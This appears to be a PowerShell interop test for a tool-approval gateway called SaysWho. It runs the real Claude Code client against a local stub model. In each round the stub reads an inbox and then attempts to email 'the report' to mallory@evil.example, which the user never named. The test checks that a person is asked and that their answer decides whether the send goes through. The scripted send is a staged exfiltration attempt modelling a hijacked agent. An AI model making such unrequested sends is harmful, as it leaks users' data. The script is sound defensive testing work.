# For a person to run: the real Claude Code client, its real approval dialog, and a stub model. It
# checks the one thing a script can't, which is that a person can read the question and that their
# answer decides the call. It takes about two minutes and costs nothing.
#
#     pwsh -NoProfile -File test/interop/dialog.ps1
#
# What keeps it free and private is the same as in run.ps1: credential and client variables are removed
# from this process, CLAUDE_CONFIG_DIR points at a throwaway folder, and ANTHROPIC_BASE_URL points at a
# stub on 127.0.0.1. No model is called. Everything it makes lives in one temp folder.
#
# In each round the stub model reads the inbox, then tries to send to mallory@evil.example, whom the
# prompt never names. SaysWho holds that call and asks. The script then looks at what really reached the
# server, so the answer doesn't rest on what the screen appeared to do.
$ErrorActionPreference = 'Stop'
$repo = (Resolve-Path (Join-Path $PSScriptRoot '../..')).Path
$work = Join-Path ([IO.Path]::GetTempPath()) ('sayswho-dialog-' + [guid]::NewGuid().ToString('N'))
$exe = if ($env:OS -eq 'Windows_NT') { '.exe' } else { '' }
$removedEnv = @()
$addedEnv = @('CLAUDE_CONFIG_DIR', 'ANTHROPIC_BASE_URL', 'ANTHROPIC_AUTH_TOKEN', 'DISABLE_TELEMETRY',
    'CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC', 'ENABLE_TOOL_SEARCH')
$failures = 0

# Allows the file to be open elsewhere, since the stub model keeps its log open while it runs.
function Read-Text([string]$path) {
    if (-not (Test-Path $path)) { return '' }
    $reader = New-Object IO.StreamReader([IO.File]::Open($path, 'Open', 'Read', 'ReadWrite'))
    try { return $reader.ReadToEnd() } finally { $reader.Close() }
}

function Invoke-Round([string]$name, [string]$instruction, [string[]]$clientFlags, [bool]$wantSent, [string]$wantRule) {
    $sends = Join-Path $work 'sends.log'
    if (Test-Path $sends) { Remove-Item $sends }
    $steps = Join-Path $work "$name.steps"
    [IO.File]::WriteAllText($steps, '[{"tool":"mcp__sayswho__mail__read_inbox","input":{}},' +
        '{"tool":"mcp__sayswho__mail__send_mail","input":{"to":"mallory@evil.example","body":"the report"}}]')
    $portFile = Join-Path $work "$name.port"
    $stub = Start-Process -FilePath $model -NoNewWindow -PassThru `
        -ArgumentList ('-log "{0}" -portfile "{1}" -steps "{2}"' -f (Join-Path $work "$name.model.log"), $portFile, $steps) `
        -RedirectStandardOutput (Join-Path $work "$name.stub.out") -RedirectStandardError (Join-Path $work "$name.stub.err")
    try {
        for ($i = 0; $i -lt 100 -and -not (Test-Path $portFile); $i++) { Start-Sleep -Milliseconds 50 }
        $env:ANTHROPIC_BASE_URL = 'http://127.0.0.1:' + (Get-Content $portFile).Trim()
        Write-Host ''
        Write-Host "=== Round: $name" -ForegroundColor Cyan
        Write-Host 'Claude Code will open here. If it asks whether to trust the folder, say yes: it is an empty temp folder.'
        Write-Host 'A question from SaysWho will appear, naming mallory@evil.example.'
        Write-Host "When it does: $instruction" -ForegroundColor Yellow
        Write-Host 'Once the model has said "done", leave with /exit and Enter, or press Ctrl+C twice.'
        Read-Host 'Press Enter to start' | Out-Null
        $state = Join-Path $work "$name-state"
        & $gateway run --policy $policy --state $state --prompt-file $prompt --client $claude.Source -- `
            --model stub --allowedTools 'mcp__sayswho__mail__read_inbox,mcp__sayswho__mail__send_mail' @clientFlags
    } finally {
        Stop-Process -Id $stub.Id -Force -ErrorAction SilentlyContinue
    }
    $sent = (Read-Text $sends).Contains('mallory@evil.example')
    $logText = Read-Text (Join-Path $state 'audit.log')
    $asked = $logText -match '"decision":"ask"'
    $ruled = $logText.Contains('"rule":"' + $wantRule + '"')
    $good = ($sent -eq $wantSent) -and $asked -and $ruled
    Write-Host ("{0}  {1}: asked={2}, reached the server={3}, wanted {4}={5}" -f $(if ($good) { 'PASS' } else { 'FAIL' }), $name, $asked, $sent, $wantRule, $ruled)
    if (-not $good) { $script:failures++ }
}

try {
    New-Item -ItemType Directory -Force $work | Out-Null
    $gateway = Join-Path $work "sayswho$exe"
    $echo = Join-Path $work "echoserver$exe"
    $model = Join-Path $work "stubmodel$exe"
    Push-Location $repo
    try {
        go build -o $gateway ./cmd/sayswho
        go build -o $echo ./test/interop/echoserver
        go build -o $model ./test/interop/stubmodel
    } finally {
        Pop-Location
    }
    $claude = Get-Command claude -ErrorAction SilentlyContinue
    if (-not $claude) { throw 'claude is not on PATH' }
    Write-Host ('Claude Code version: ' + (& $claude.Source --version))

    # This process only, and put back in the finally block.
    $removedEnv = @(Get-ChildItem Env: |
        Where-Object { $_.Name -match '^(ANTHROPIC_|CLAUDE|MCP_|AWS_BEARER|OPENAI_|GEMINI_|GOOGLE_)' } |
        ForEach-Object { [pscustomobject]@{ Name = $_.Name; Value = $_.Value } })
    foreach ($v in $removedEnv) { Remove-Item "Env:$($v.Name)" }
    $env:CLAUDE_CONFIG_DIR = Join-Path $work 'claude-config'
    New-Item -ItemType Directory -Force $env:CLAUDE_CONFIG_DIR | Out-Null
    [IO.File]::WriteAllText((Join-Path $env:CLAUDE_CONFIG_DIR '.claude.json'), '{"hasCompletedOnboarding":true}')
    $env:ANTHROPIC_AUTH_TOKEN = 'local-stub-not-a-key'
    $env:DISABLE_TELEMETRY = '1'
    $env:CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC = '1'
    $env:ENABLE_TOOL_SEARCH = 'false'

    $prompt = Join-Path $work 'prompt.txt'
    [IO.File]::WriteAllText($prompt, 'Summarize my inbox and tell alice@corp.example what it says.')
    $base = Join-Path $work 'base.json'
    $sendsFile = Join-Path $work 'sends.log'
    [IO.File]::WriteAllText($base, (@{ mode = 'value'; servers = @{ mail = @{ command = $echo; args = @('-sends', $sendsFile) } } } | ConvertTo-Json -Depth 8))
    $policy = Join-Path $work 'policy.json'
    [IO.File]::WriteAllText($policy, ((& $gateway init --policy $base) -join "`n"))
    Set-Location $work # so that the client's own folder is the empty temp one

    Invoke-Round 'say-no' 'answer NO: leave Approve off, or decline.' @() $false 'ask-declined'
    Invoke-Round 'say-yes' 'answer YES: turn Approve on, and accept.' @() $true 'ask-approved'
    Invoke-Round 'say-yes-restricted' 'answer YES again. This round runs with --restricted.' @('--restricted') $true 'ask-approved'
} catch {
    Write-Host "FAIL  the run did not finish: $_"
    $failures++
} finally {
    Set-Location $repo
    foreach ($name in $addedEnv) { Remove-Item "Env:$name" -ErrorAction SilentlyContinue }
    foreach ($v in $removedEnv) { Set-Item "Env:$($v.Name)" $v.Value }
}

Write-Host ''
if ($failures -gt 0) {
    Write-Host "$failures round(s) failed. The work folder is kept: $work"
    exit 1
}
Write-Host 'All three rounds passed: a person was asked, and their answer decided the call.'
Start-Sleep -Milliseconds 200
Remove-Item $work -Recurse -Force -ErrorAction SilentlyContinue
exit 0
